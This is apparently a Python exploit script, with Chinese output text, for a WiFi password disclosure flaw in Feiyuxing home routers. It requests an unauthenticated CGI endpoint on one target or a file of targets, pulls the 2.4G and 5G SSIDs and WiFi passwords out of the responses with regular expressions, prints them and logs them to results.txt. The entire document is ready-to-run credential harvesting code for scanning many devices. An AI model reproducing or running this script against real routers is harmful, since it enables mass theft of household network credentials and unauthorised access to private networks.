#!/usr/bin/python3
#-*- coding:utf-8 -*-

import re
import requests
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def header():
	print('\033[32m!***********************************************!\033[0m')
	print('\033[32m!description:飞鱼星家用智能路由器wifi密码泄漏   !\033[0m')
	print('\033[32m!             Author:Fly_Wuhoo                  !\033[0m')
	print('\033[32m!***********************************************!\033[0m')

def Write_Results(url,g2,g5,pass2,pass5):
	with open('results.txt','a+') as wp:
		wp.write(url+'\n')
		wp.write('用户名：{}'.format(g2)+'\n')
		wp.write('密码：{}'.format(pass2)+'\n')
		wp.write('用户名：{}'.format(g5)+'\n')
		wp.write('密码：{}'.format(pass5)+'\n')

def Arg_Parse():
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",metavar='',help="目标url地址")
	parser.add_argument("-f","--file",metavar='',help="目标地址文件")
	args = parser.parse_args()
	return args

def Detect(url):
	vuln_url = url+'/request_para.cgi?parameter=wifi_info'
	headers={
	"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.3538.77 Safari/537.36",
	"Content-Type": "application/x-www-form-urlencoded"
}
	try:
		response = requests.get(url=vuln_url,headers=headers,verify=False,timeout=5)
		print("\033[32m正在检测:{}\033[0m".format(vuln_url))
		if response.status_code == 200 and "ssid" in response.text:
			print("\033[31m{}存在漏洞！！！\033[0m".format(vuln_url))
			ssid_2g = re.findall(r'ssid_2g":"(.*?)"',response.text)[0]
			ssid_5g = re.findall(r'ssid_5g":"(.*?)"',response.text)[0]
			pass_2g = re.findall(r'wl_passwd_2g":"(.*?)"',response.text)[0]
			pass_5g = re.findall(r'wl_passwd_5g":"(.*?)"',response.text)[0]
			print("\033[31m帐号： {}\033[0m".format(ssid_2g))
			print("\033[31m密码： {}\033[0m".format(pass_2g))
			print("\033[31m帐号： {}\033[0m".format(ssid_5g))
			print("\033[31m密码： {}\033[0m".format(pass_5g))
			if key:
				Write_Results(vuln_url,ssid_2g,ssid_5g,pass_2g,pass_5g)
			else:
				pass
		else:
			print("\033[32m未检测到该漏洞存在！！！ \033[0m")
	except:
		print("\033[32m{}访问失败！！！ \033[0m".format(vuln_url))

if __name__ == '__main__':
	args = Arg_Parse()
	header()
	if args.url:
		key = 0
		Detect(args.url)	
	elif args.file:
		key=1
		with open(args.file,'r') as fp:
			for line in fp.readlines():
				Detect(line.strip())
	else:
		print("\033[33m输入的参数有误，请使用-h参数查看脚本用法 \033[0m")